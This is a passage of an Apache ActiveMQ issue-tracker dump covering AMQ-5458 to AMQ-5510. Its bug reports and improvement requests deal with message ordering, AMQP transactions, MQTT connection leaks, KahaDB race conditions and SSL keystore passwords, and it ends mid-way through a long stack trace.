texts:prefetched messages go bottom in a message list of a JMX queue.browse
With a prefetch smaller than queue depth a browse of delivered and unconsumed messages will loos message order. The prefetched messages appearing after the rest of the messages in the queue. The dispatch order is preserved, but the JMX destination view browse list order is incorrect.Sending 100 messages, consuming 5 with prefetch 10 and closing the consumer. A subsequent QueueView.browse Expect &#91;5,6,...100&#93; but get &#91;20,21...100,5,6...&#93;
issueID:AMQ-5458
type:New Feature
changed files:
texts:MBean to help testing replicated levelDB
Would be nice if you set a system property like "org.apache.activemq.leveldb.test=true" that you then get a MBean for leveldb stores that allows you to suspend/resume calls around the journal writes, deletes and force operations so you can more easily write tests that validate consistency and recovery.
issueID:AMQ-5462
type:Improvement
changed files:ActiveMQConnection.java
texts:dead code in method createSession of class ActiveMQConnection
org.apache.activemq.ActiveMQConnection ==>in method "public Session createSession(boolean transacted, int acknowledgeMode)  throws JMSException" in statement &#91;return new EMQSession ... &#93;code &#91;acknowledgeMode == Session.SESSION_TRANSACTED&#93; is dead.because this condition has been decided in method entrance.Futhermore when using tranaction,the acknowledge mode must be 0.This is right or not?
issueID:AMQ-5464
type:Improvement
changed files:AmqpProtocolConverter.java
texts:enable use of &#39;Configuration&#39; TerminusDurability to signal a DurableSubscription
Currently, the broker interprets a Source TerminusDurability of "UnsettledState" to indicate use of a DurableSubscription when creating an AMQP consumer against a Topic.This patch similarly enables use of the "Configuration" TerminusDurability to signal a DurableSubscription when creating an AMQP consumer against a Topic.
issueID:AMQ-5467
type:Bug
changed files:
texts:AMQP transaction may fail to commit, or process unexpected messages, if consumer acks are not in a single unbroken sequential range
When consuming messages in a transaction, the AMQP consumer accepts messages and specifies the transaction they are part of. AMQPProtocolConverter keeps a record of messages accepted in this way. When the transaction is committed, AMQPProtocolConverter assumes that the first and last messages in this "dispatched in Tx" list form a range, and creates a ranged "standard ack" MessageAck to cover the messages. The broker then checks that the acks it is processing match messages it has previously dispatched, in PrefetchSubscription#assertAckMatchesDispatched(MessageAck).If the messages aren"t added to the AMQP transaction in sequence, e.g. the assumed "last id" is actually for a message dispatched before the assumed "first id" in the sequence, the check fails even though all the messages being acked are in the dispatched list. There is also an implicit assumption in the processing that the ack range is an unbroken sequence, and as a result it would seem possible for messages to be acked that were not actually considered part of the AMQP transaction. This non-sequential ordering can for example happen because a client isn"t releasing unconsumed prefetched messages after a rollback of consumed messages, or alternatively is processing higher priority messages before lower priority messages originally dispatched to it earlier. To combat these issues, the AMQP transaction commit processing should be updated to use "individual acks".
issueID:AMQ-5468
type:Bug
changed files:
texts:AMQ MQTT doesn&#39;t reject remote connection after a long time
Test steps: Using jConsole to explore JMX MBean clientConnectors (MQTT+NIO connector). Using telnet client connect to MQTT+NIO port On jConsole: clientConnectors/mqtt+nio/remoteAddess appear a new connection with IP and local port which connect to. Close telnet program Waiting a long time (could be more than a day) and view remoteAddess again on jConsole but Remote IP (telnet) does not remove.Imagine that if a human open a thousand or million connections to server, AMQ not release connections after short time, then AMQ could be throws the ERROR "To many open files" and it doesn"t access new connection.In production server (ulimit max-open-files 65000), i"m using 2 thousand clients but after 2 days, many ERROR "To many open files" in activemq.log to be throws.On jConsole, number of clientId is equals with clients, but RemoteIP contains more than 65000 IPs.
issueID:AMQ-5470
type:Sub-task
changed files:
texts:AMQP - delayed authentication from SASL connect leads to race on client end.
We currently delay checking the credentials provided during the SASL negotiation and also checking if anonymous client connects are legal until after opening the proton connection and then we send an error condition indicating the failure and close the connection.  This can lead to a race on the client end where it looks for a breif moment in time that the connection succeeded.  During that time the client might attempt some further action and then fail in an odd way as the connection is closed under it.  We should look into authenticating immediately and failing the SASL handshake if not authorized.  We should also consider whether we want to support raw connections with a SASL handshake as well since without at least a SASL ANONYMOUS handshake we can get back into this issue unless we just forcibly close the socket on a client if we don"t support anonymous connections.
issueID:AMQ-5472
type:Bug
changed files:
texts:RAR; stopped connection (due to SecurityException) not evicted from JCA pool
If there is a securityException on an initial connection attempt, the transport is disposed, AMQ-3294The resulting socket read error does not bubble up to a registered exception listener leaving an invalid/Stopped pooled managed connection. The connection is unusable and needs to be purged via administration
issueID:AMQ-5473
type:Bug
changed files:TopicRegion.java
texts:Race condition caused by Linkstealing might make durable subs inactive
Link Stealing creates a new connection and disconnects the old connection. These operations are done concurrently.New connection triggers addConsumer() for active subscriptions and old connection stop causes removeConsumer() for the same.Problems: addConsumer() would throw exception that the sub is already active (if remove did not happen before) even if we go past the exception, it will not set the right (new) connection context and consumer info the subs removeConsumer() may remove subcription even if it had different connection context (created by linkstealing)Patch attached.
issueID:AMQ-5475
type:Bug
changed files:
texts:AMQP transport does not send correct response to unsupported clients
Section 2.2 of the AMQP 1.0 spec covers protocol negotiation and states that when a client connects and send an AMQP header with an unsupported version the broker should send back an AMQP header with the version supported before closing the socket.  This also applied if the header cannot be parsed, such as a HTTP client etc connecting to the AMQP transport port.  We currently just close the socket which does not give the connecting client any insight into why the connect failed and allow it to try again with the correct protocol if supported.
issueID:AMQ-5476
type:Bug
changed files:
texts:Batch transactions of priority messages: javax.jms.JMSException: Unmatched acknowledge: MessageAck {commandId = 14, responseRequired = false, ackType = 2, ...Could not find Message-ID XXX in dispatched-list (start of ack)
with mixed priority messages, consuming in batches, occasional async error on batched ack pre commit.javax.jms.JMSException: Unmatched acknowledge: MessageAck {commandId = 14, responseRequired = false, ackType = 2, consumerId = XXX, firstMessageId = XXX, lastMessageId = XXX, destination = queue://xxx, transactionId = XXX, messageCount = 20, poisonCause = null}; Could not find Message-ID XXX in dispatched-list (start of ack) at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:480)
issueID:AMQ-5479
type:Improvement
changed files:
texts:bin/activemq batch script error message prints wrong variable
bin/activemq line 334:  echo "       (JAVA_HOME="$JAVAHOME", JAVACMD="$JAVACMD")"This line prints the value of the variable {$JAVAHOME} instead of {$JAVA_HOME}.I think the line should be changed to  echo "       (JAVA_HOME="$JAVA_HOME", JAVACMD="$JAVACMD")"
issueID:AMQ-5480
type:Improvement
changed files:SelectorManager.java
texts:Provider fine-grained control for SelectorManager&#39;s threadpool
In SelectorManager::createDefaultExecutor, the ThreadPoolExecutor is created with Integer.MAX_VALUE as MaximumPoolSize. This does not work well under our scenarios. It would be nicer to give fine-control over CorePoolSize, MaximumPoolSize  as what"s been done for KeepAlive Time
issueID:AMQ-5481
type:Improvement
changed files:MQTTProtocolConverter.java
texts:Trace logs in MQTT Protocol Converter
Adding trace messages in MQTT Protocol Converter for easier debugging.
issueID:AMQ-5483
type:Bug
changed files:
texts:LRU cached message group map eviction is not reflected in consumer assigned counts
by default, consumers are ordered by consumer priority and number of assigned message groups. The group assignment lru map can evict group associations, but the eviction is only noticed on next use of the groupid at dispatch, which may never happen. This leaves consumers less likely to get new groups assigned in error. The combination of a low cache size and long lives consumers should allow even distribution.
issueID:AMQ-5484
type:Bug
changed files:AmqpProtocolConverter.java
texts:AMQP Memory leaks in the AMQP Protocol converter on sender link close
On close of sender links we do not clean up all the mappings for the ConsumerContext instances which leads a build up of context objects in the subscriptions map.
issueID:AMQ-5486
type:Bug
changed files:
texts:Thread synchronization overhead is unexpectedly high
There"s about 20 topics with virtual topic enabled, hundreds of comsumers/producers connected to MQ on NIO transport connector. During the run there"re about 12000 msg flow in per second, not a very high rate, but ActiveMQ consumes a lot of CPU resource (about 600%~1000%). To find out what"s the most CPU consuming code path, I use JProfiler to dig into the process. Among all the NIO worker threads, most of them were frequently blocked and did a little job between the "unblocked" time. While they"re expected spend most of their time slices on waiting for work item and processed them.After reviewing the monitor usage history and stats, I think these NIO workers were competing fiercely with each other on executing a synchronized method (DestinationMap::get), which is also the most hot spot in the program . I also notice that the caller AbstractRegion::getDestinations acquires a read lock before calling it, so I guess this could be a left out, read lock is the actual lock type required here.It"s too difficult for me to list all critical sections between NIO workers, or between NIO workers and BrokerService which adds up to the overall synchronize overhead. So I attach the relevant info, with the hope of finding a complete solution to this.
issueID:AMQ-5491
type:New Feature
changed files:
texts:Standalone Web console Session timeout with user/password input
We use the web console as a standalone application deployed on a Jetty instance.And we need to secure web access to it with ssl and user/password authentication.We need to have a session timeout and to force re-input of the credentials on each session expiry.As BASIC authentication does not allow easily to force login again on each HTTP session expiration I have to add a login form and a default session expiration of 30 minutes.I am attaching to this request the git patch proposal containing: a new file login.html (modified copy of 403.html) the modified site.css and the modified web.xml (with extra <session-config>)The Git patch is made on the current 5.11 SNAPSHOT.The top commit at the moment I cloned the project from Git on the master branch is:commit d25c52ccb2c9c23535f9d4488fe8be8600148852Author: gtully <gary.tully@gmail.com>Date:   Thu Dec 11 14:40:56 2014 +0000    https://issues.apache.org/jira/browse/AMQ-5483 - fix and test - assigned group counts are updated when lru map evicts a group assignment
issueID:AMQ-5493
type:Bug
changed files:MessageDatabase.java
texts:KahaDB MessageDatabase race condition while stopping the broker and cleaning up
This issue was seen on the surface via the following broker INFO log message:2014-12-10 16:21:58,842 | INFO  | KahaDB: Recovering checkpoint thread after death | org.apache.activemq.store.kahadb.MessageDatabase | Thread-26This means that the checkpoint thread is being revived unnecessarily whilestopping the broker. It could even happen that it is revived multiple times before the closing process is completed.To show the flow of the race condition, consider the following blocks of code from activemq/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/MessageDatabase.java:Lines 425 - 442 &#91;in close()&#93;if( opened.compareAndSet(true, false)) {     ... some code ...          if (metadata.page != null) {               checkpointUpdate(true);          }     ... some code ...}Lines 1499 - 1501 &#91;in checkpointUpdate(boolean)&#93;public void execute(Transaction tx) throws IOException {     checkpointUpdate(tx, cleanup);}Line 1524 &#91;in checkpointUpdate(Transaction, boolean)&#93;metadata.ackMessageFileMapLocation = checkpointAckMessageFileMap();Line 1735 &#91;in checkpointAckMessageFileMap()&#93;Location location = store(new KahaAckMessageFileMapCommand().setAckMessageFileMap(new Buffer(baos.toByteArray())), nullCompletionCallback);Lines 993 - 995 &#91;in store(...)&#93;if (checkpointThread != null && !checkpointThread.isAlive()) {     startCheckpoint();}Lines 332  - 372  &#91;In startCheckpoint()&#93;if (checkpointThread == null) {     start = true;} else if (!checkpointThread.isAlive()) {     start = true;      LOG.info("KahaDB: Recovering checkpoint thread after death");}if (start) {     checkpointThread = new Thread("ActiveMQ Journal Checkpoint Worker") {          @Override          public void run() {               try {                     ... some code ...                     while (opened.get()) {                          ... some code ...                     }                } catch (InterruptedException e) {                            // Looks like someone really wants us to exit this thread...                } catch (IOException ioe) {                            LOG.error("Checkpoint failed", ioe);                            brokerService.handleIOException(ioe);               }          }     };     checkpointThread.setDaemon(true);     checkpointThread.start();}Here is the sequence of events, involving code above that shows the race:1. in close() set "opened" to false2. in startCheckpoint() "opened.get()" is false so checkpoint thread exits run method and makes checkpointThread.isAlive() false3. in store(...) calling startCheckpoint() which will revive the checkpoint thread againAdded some INFO logs to confirm the order above:2014-12-17 13:27:43,678 | INFO  | patanasov: from unload() calling close() | org.apache.activemq.store.kahadb.MessageDatabase | Thread-182014-12-17 13:27:43,678 | INFO  | patanasov: close(): set opened to false; calling checkpointUpdate(true) | org.apache.activemq.store.kahadb.MessageDatabase | Thread-182014-12-17 13:27:43,678 | INFO  | patanasov: startCheckpoint(): checkpointThread exiting its run method | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker2014-12-17 13:27:43,681 | INFO  | patanasov: from store() calling startCheckpoint() | org.apache.activemq.store.kahadb.MessageDatabase | Thread-182014-12-17 13:27:43,682 | INFO  | KahaDB: Recovering checkpoint thread after death | org.apache.activemq.store.kahadb.MessageDatabase | Thread-18Based on my limited understanding of this code, this does not seem to have any serious negative impacts, but it would be nice to be looked at by the community.   It does not seem to make sense to revive the thread after opened.get() became false because the checkpointThread will not do anything anyway due to opened.get() being false at that point. Consider the body of the checkpointThread:MessageDatabase.java, Lines 348 - 359while (opened.get()){     ... code that will attempt updates ...}However, since opened.get() is false, this will not enter the while loop and hence the checkpointThread will exit its run quickly again.A possible fix for this is the followingLines 993 - 995 &#91;in store(...)&#93;changeif (checkpointThread != null && !checkpointThread.isAlive()) {     startCheckpoint();}toif (checkpointThread != null && !checkpointThread.isAlive() && opened.get()) {     startCheckpoint();}If opened.get() is false, then we must be closing and we will not revive the thread.
issueID:AMQ-5495
type:Improvement
changed files:ActiveMQSslConnectionFactory.java
texts:ActiveMQSslConnectionFactory should support different keystore and key passwords
The current ActiveMQSslConnectionFactory allows us to specify trustStore trustStorePassword keyStore keyStorePasswordIn case the passphrase of the key contained in the keystore is different from the password of the keystore itself this connection factory cannot be used.What we"re missing is the following field keyStoreKeyPasswordIn the ActiveMQ configuration such a setup is supported (via the SpringSslContext), however for accessing ActiveMQ via the ActiveMQSslConnectionFactory it is not.Adding a keyStoreKeyPassword field and changing the createKeyManager slightly would fix this:    protected KeyManager[] createKeyManager() throws Exception {             KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());        KeyStore ks = KeyStore.getInstance("jks");        KeyManager[] keystoreManagers = null;        if (keyStore != null) {            byte[] sslCert = loadClientCredential(keyStore);            if (sslCert != null && sslCert.length > 0) {                ByteArrayInputStream bin = new ByteArrayInputStream(sslCert);                ks.load(bin, keyStorePassword.toCharArray());                kmf.init(ks, keyStoreKeyPassword !=null ? keyStoreKeyPassword.toCharArray() : keyStorePassword.toCharArray());                keystoreManagers = kmf.getKeyManagers();            }        }        return keystoreManagers;    }
issueID:AMQ-5499
type:Improvement
changed files:
texts:Add means to dynamically allocate port number for integration testing using maven plugin
Port numbers for connectors can be dynamically allocated using special port number 0, but there is currently no way for integration clients to determine the correct port number.Registering the connector URI"s as maven project properties makes it easy to use the dynamically-allocated port numbers, making integration tests safer to run on a shared server by eliminating the possibility of port conflicts.
issueID:AMQ-5505
type:Improvement
changed files:BrokerView.java
BrokerService.java
BrokerViewMBean.java
texts:Add support for the BrokerView MBean to get the up-time in milliseconds
Currently one can only get the broker"s up-time as a formatted string via JMX. I need to be able to get the up-time in milliseconds as we"re using DataDog as our monitoring tool (which doesn"t understand the current up-time formatted string). The up-time formatted string will remain as-is.
issueID:AMQ-5506
type:Bug
changed files:
texts:typo in ZkSessionTmeout attribute of leveldb replication
None
issueID:AMQ-5510
type:Bug
changed files:
texts:Listener is not able to connect again once maxReconnectAttempts are exhausted by the ActiveMQ layers.
I have multiple listeners sharing same connection and the broker url has maxReconnectAttempts property set to 5.If I restart the broker, the ActiveMQ layer tries 5 reconnect attempts then gives up and the listener throws up connection refused exception and then tries to refresh the jms connection and says its refreshed but there is not connection made to ActiveMQ and the listener again throws up connection refused exception and again refreshes the jms connection but fails. This process continues indefinitely.However, I use single listener and no sharing of connection, this works fine. The ActiveMQ layers tries 5 reconnect attempts fails, listener throws up exception and again triggers reconnect attempts which does not happens in case of multiple listener.This issue doesn"t happen with ActiveMQ 5.8.0Steps to reproduce this issue:<bean id="connectionFactory" class="org.apache.activemq.ActiveMQConnectionFactory">        <property name="brokerURL" value="failover:(tcp://<hostname1>:61616?wireFormat.maxInactivityDuration=120000,tcp://<hostname2>:61616?wireFormat.maxInactivityDuration=120000)?randomize=false&maxReconnectAttempts=5" />    </bean><bean id="jmsConnectionFactory"        class="org.apache.activemq.pool.PooledConnectionFactory"        destroy-method="stop">        <property name="connectionFactory" ref="connectionFactory" />    </bean>    <amq:topic id="testTopic" physicalName="test.topic"/>    <!-- The message listener container to invoke the consumer -->    <bean id="jmsContainer1"        class="org.springframework.jms.listener.DefaultMessageListenerContainer"        p:connectionFactory-ref="jmsConnectionFactory"        p:destination-ref="testTopic"        p:pubSubDomain="true"        p:subscriptionDurable="false"        p:sessionTransacted="true"        p:messageListener-ref="consumer" />    <bean id="jmsContainer2"        class="org.springframework.jms.listener.DefaultMessageListenerContainer"        p:connectionFactory-ref="jmsConnectionFactory"        p:destination-ref="testTopic"        p:pubSubDomain="true"        p:subscriptionDurable="false"        p:sessionTransacted="true"        p:messageListener-ref="consumer" />Use this configuration and start the application.Now restart the ActiveMQ broker once the listeners successfully connect.Here are some logs:20141223 01:21:39.277 EST (ActiveMQ Task-3) org.apache.activemq.transport.failover.FailoverTransport#doReconnect 1089 ERROR - Failed to connect to [tcp://argon47.nyc:61616?wireFormat.maxInactivityDuration=120000, tcp://argon36.nyc:61616?wireFormat.maxInactivityDuration=120000] after: 5 attempt(s) 20141223 01:21:39.277 EST (ActiveMQ Task-3) org.apache.activemq.ActiveMQConnection#onAsyncException 2010 DEBUG - Async exception with no exception listener: java.net.ConnectException: Connection refused java.net.ConnectException: Connection refused        at java.net.PlainSocketImpl.socketConnect(Native Method)        at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:345)        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)        at java.net.Socket.connect(Socket.java:589)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:501)        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:464)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:138)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:1017)        at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:148)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        at java.lang.Thread.run(Thread.java:745)20141223 01:21:39.279 EST (ActiveMQ Connection Executor: unconnected) org.apache.activemq.transport.failover.FailoverTransport#stop 366 DEBUG - Stopped unconnected 20141223 01:21:39.279 EST (ActiveMQ Connection Executor: unconnected) org.apache.activemq.util.ThreadPoolUtils#shutdownNow 54 DEBUG - Forcing shutdown of ExecutorService: java.util.concurrent.ThreadPoolExecutor@31736876&#91;Running, pool size = 2, active threads = 0, queued tasks = 0, completed tasks = 5&#93; 20141223 01:21:39.281 EST (ActiveMQ Connection Executor: unconnected) org.apache.activemq.pool.PooledConnectionFactory$1$1#onException 110 INFO - Expiring connection ActiveMQConnection {id=ID:cobalt14.nyc.deshaw.com-49500-1419315471791-1:1,clientId=ID:cobalt14.nyc.deshaw.com-49500-1419315471791-0:1,started=false} on IOException: java.net.ConnectException: Connection refused 20141223 01:21:39.281 EST (ActiveMQ Connection Executor: unconnected) org.apache.activemq.pool.PooledConnectionFactory$1$1#onException 111 DEBUG - Expiring connection on IOException java.net.ConnectException: Connection refused        at java.net.PlainSocketImpl.socketConnect(Native Method)        at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:345)        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)        at java.net.Socket.connect(Socket.java:589)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:501)        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:464)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:138)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:1017)at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:148)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        at java.lang.Thread.run(Thread.java:745)20141223 01:21:39.282 EST (jmsContainer2-1) org.apache.activemq.jms.pool.PooledSession#close 119 WARN - Caught exception trying rollback() when putting session back into the pool, will invalidate. javax.jms.IllegalStateException: The Session is closed javax.jms.IllegalStateException: The Session is closed        at org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:767)        at org.apache.activemq.ActiveMQSession.rollback(ActiveMQSession.java:588)        at org.apache.activemq.jms.pool.PooledSession.close(PooledSession.java:116)        at org.springframework.jms.support.JmsUtils.closeSession(JmsUtils.java:108)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.clearResources(DefaultMessageListenerContainer.java:1143)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:1002)        at java.lang.Thread.run(Thread.java:745)20141223 01:21:39.282 EST (jmsContainer1-1) org.apache.activemq.jms.pool.PooledSession#close 119 WARN - Caught exception trying rollback() when putting session back into the pool, will invalidate. javax.jms.IllegalStateException: The Session is closed javax.jms.IllegalStateException: The Session is closed        at org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:767)        at org.apache.activemq.ActiveMQSession.rollback(ActiveMQSession.java:588)        at org.apache.activemq.jms.pool.PooledSession.close(PooledSession.java:116)        at org.springframework.jms.support.JmsUtils.closeSession(JmsUtils.java:108)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.clearResources(DefaultMessageListenerContainer.java:1143)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:1002)        at java.lang.Thread.run(Thread.java:745)20141223 01:21:39.283 EST (jmsContainer2-1) org.springframework.jms.listener.DefaultMessageListenerContainer#handleListenerSetupFailure 839 WARN - Setup of JMS message listener invoker failed for destination "topic://cometd.seedTCAStatusPush" - trying to recover. Cause: Connection refused javax.jms.JMSException: Connection refused        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:72)        at org.apache.activemq.ActiveMQMessageConsumer.dequeue(ActiveMQMessageConsumer.java:484)        at org.apache.activemq.ActiveMQMessageConsumer.receive(ActiveMQMessageConsumer.java:631)        at org.apache.activemq.jms.pool.PooledMessageConsumer.receive(PooledMessageConsumer.java:67)        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveMessage(AbstractPollingMessageListenerContainer.java:430)        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.doReceiveAndExecute(AbstractPollingMessageListenerContainer.java:310)        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:263)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1102)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1094)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:991)        at java.lang.Thread.run(Thread.java:745)Caused by: java.net.ConnectException: Connection refusedat java.net.PlainSocketImpl.socketConnect(Native Method)        at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:345)        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)        at java.net.Socket.connect(Socket.java:589)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:501)        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:464)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:138)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:1017)        at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:148)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        ... 1 more20141223 01:21:39.283 EST (jmsContainer1-1) org.springframework.jms.listener.DefaultMessageListenerContainer#handleListenerSetupFailure 839 WARN - Setup of JMS message listener invoker failed for destination "topic://cometd.seedTCAStatusPush" - trying to recover. Cause: Connection refused javax.jms.JMSException: Connection refused        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:72)        at org.apache.activemq.ActiveMQMessageConsumer.dequeue(ActiveMQMessageConsumer.java:484)        at org.apache.activemq.ActiveMQMessageConsumer.receive(ActiveMQMessageConsumer.java:631)        at org.apache.activemq.jms.pool.PooledMessageConsumer.receive(PooledMessageConsumer.java:67)        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveMessage(AbstractPollingMessageListenerContainer.java:430)        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.doReceiveAndExecute(AbstractPollingMessageListenerContainer.java:310)        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:263)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1102)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1094)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:991)        at java.lang.Thread.run(Thread.java:745)Caused by: java.net.ConnectException: Connection refused        at java.net.PlainSocketImpl.socketConnect(Native Method)        at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:345)        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)        at java.net.Socket.connect(Socket.java:589)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:501)        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:464)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:138)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:1017)        at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:148)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        ... 1 more20141223 01:21:39.284 EST (jmsContainer2-1) org.springframework.jms.listener.DefaultMessageListenerContainer#refreshConnectionUntilSuccessful 891 INFO - Successfully refreshed JMS Connection 20141223 01:21:39.284 EST (jmsContainer1-1) org.springframework.jms.listener.DefaultMessageListenerContainer#refreshConnectionUntilSuccessful 891 INFO - Successfully refreshed JMS Connection 20141223 01:21:44.286 EST (jmsContainer1-2) org.springframework.jms.listener.DefaultMessageListenerContainer#handleListenerSetupFailure 839 WARN - Setup of JMS message listener invoker failed for destination "topic://cometd.seedTCAStatusPush" - trying to recover. Cause: org.apache.activemq.ConnectionFailedException: The JMS connection has failed: Connection refused javax.jms.IllegalStateException: org.apache.activemq.ConnectionFailedException: The JMS connection has failed: Connection refused        at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:135)        at org.apache.activemq.jms.pool.PooledConnection.createSession(PooledConnection.java:167)        at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:197)        at org.springframework.jms.listener.DefaultMessageListenerContainer.access$1400(DefaultMessageListenerContainer.java:119)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.initResourcesIfNecessary(DefaultMessageListenerContainer.java:1122)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1101)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1094)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:991)        at java.lang.Thread.run(Thread.java:745)Caused by: org.apache.activemq.ConnectionFailedException: The JMS connection has failed: Connection refused        at org.apache.activemq.ActiveMQConnection.checkClosedOrFailed(ActiveMQConnection.java:1492)        at 